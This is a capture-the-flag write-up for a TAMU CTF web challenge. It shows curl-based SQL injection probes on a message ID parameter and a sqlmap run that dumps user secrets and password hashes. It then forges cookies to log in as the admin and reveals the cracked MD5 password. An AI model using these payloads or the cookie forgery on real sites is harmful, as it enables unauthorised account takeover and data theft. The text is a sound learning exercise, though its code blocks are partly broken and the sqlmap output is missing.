## Description:

A website with a registration form and a login form was linked to.

```

## Solution:

We start by registering to the service:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl -v "http://web6.tamuctf.com/register_user" -X POST --data "firstname=a&lastname=a&password=a&phone=1234567891&Submit=Register"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 34.208.211.186...
* TCP_NODELAY set
* Connected to web6.tamuctf.com (34.208.211.186) port 80 (#0)
> POST /register_user HTTP/1.1
> Host: web6.tamuctf.com
> User-Agent: curl/7.61.0
> Accept: */*
> Content-Length: 66
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 66 out of 66 bytes
< HTTP/1.1 302 Found
< Server: nginx/1.15.8
< Date: Tue, 12 Mar 2019 19:49:56 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 0
< Connection: keep-alive
< Set-Cookie: userid=3; path=/
< Set-Cookie: secret=TKH4FPK7FOEXG7VW; path=/
< Location: /
<
* Connection #0 to host web6.tamuctf.com left intact
```

Note that we received two cookies: `userid` and `secret`.
We'll return to them later, but first let's take a look around and see what registered users can access.

The main page contains three tabs.

The first tab contains the user profile:
```
Name: a a
Username: aa
Phone: 123-456-7891
Email: aa@1337secur1ty.hak
Account Created On: 03/12/19 19:49
Description:
```

In addition, there's a link to a QR code:
```
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# zbarimg a.png
QR-Code:otpauth://totp/TAMU_CTF?secret=TKH4FPK7FOEXG7VW
scanned 1 barcode symbols from 1 images in 0.17 seconds
```

The secret is identical to the one in the cookie, and in general this is a format that belongs to a Time-based One-time Password protocol, like the ones used by major services for 2 Factor Authentication.

There are mobile applications such as Google Authenticator that upon scanning the QR code, will provide a time-based one-time-password needed in order to login to the application. A web-based alternative can be found [here](https://gauth.apps.gbraad.nl/#main).

Back to the website. Another tab contains the "messages" page, which has a single message:
```
http://web6.tamuctf.com/message?id=2

From: Joe (1337-admin)
Date: 03/12/19
Time: 19:49
Message:
Welcome to 1337 Secur1ty, the family that you want to work at 16 hours a day. Because here at 1337 Secur1ty, we care!
```

Last but not least, there is an "Employees" tab with the following information:
```
ID	Username	Name            Email	                        Phone          Joined
1	1337-admin	Joe Joeson	1337-admin@l337secur1ty.hak	*	        03/12/19 19:42
2	ScrubLord	Bob Bobson	ScrubLord@l337secur1ty.hak	*	        03/12/19 19:42
3	aa	        a a	        aa@1337secur1ty.hak	        123-456-7891	03/12/19 19:49
```

Reading a bit about the OTP protocol, I discovered that [the "secret" is simply a base32 encoded value](https://github.com/google/google-authenticator/wiki/Key-Uri-Format). My initial thought was that it was based on the time that the user joined, and since we had this information in the Employees page, we needed to figure out how to generate a secret identical to the Admin's.

However, after registering several users and comparing their secrets, I couldn't find any obvious pattern.

Therefore, I went back to the "messages" page, and attempted to access other messages by modifying the URI parameter.

Changing the ID to "1" revealed the following message:
```
From: Bob (ScrubLord)
Date: 03/12/19
Time: 19:42
Message:
Please don't blow off the meeting today, we need to talk about the cookies.
```

As we saw, the cookie contains a `userid` and a `secret`. We can replace them with other values, but what should they be?

Searching for some other vulnerability in the website, I tried:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id='"
Brought to you by the 1337est of Secur1ty!!!
```

It looked like they has some kind of protection against SQL injection, since this message wasn't the regular response for invalid IDs:
```
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id=f"
<b>From:</b>  ()<br><b>Date:</b> //<br><b>Time:</b> <br><b>Message:</b> <br style='margin-bottom:10px;'><br><br><button id='back'>Back</button><script type='text/javascript'>document.getElementById('back').onclick = function () {location.href = '/';};</script>
```

However a slightly more complex value hinted that an SQLi vulnerability is indeed hiding behind the service:
```console
/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id=1'%20and%20'1'='1"
<b>From:</b> Bob (ScrubLord)<br><b>Date:</b> 03/12/19<br><b>Time:</b> 19:42<br><b>Message:</b> <br style='margin-bottom:10px;'>Please don't blow off the meeting today, we need to talk about the cookies.<br><br><button id='back'>Back</button><script type='text/javascript'>document.getElementById('back').onclick = function () {location.href = '/';};</script>
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id=1'%20and%20'2'='1"
<b>From:</b>  ()<br><b>Date:</b> //<br><b>Time:</b> <br><b>Message:</b> <br style='margin-bottom:10px;'><br><br><button id='back'>Back</button><script type='text/javascript'>document.getElementById('back').onclick = function () {location.href = '/';};</script>
```

Time to fire up SQLMap:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2

We have the username, secret and hash of the password for each of the users. SQLMap was even able to crack the hash of our user. So if we can crack the hash of the admin, we have everything we need in order to sign in as admins ourselves. 

But is there an easier way? What if we replace our cookie values with the admin's values?

```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl --cookie "secret=WIFHXDZ3BOHJMJSC;userid=1" http://web6.tamuctf.com/

Looks like breaking the hash wasn't needed at all (although it wasn't a hard task either - `02ca0b0603222a090fe2fbf3ba97d90c = md5(secretpasscode)`).
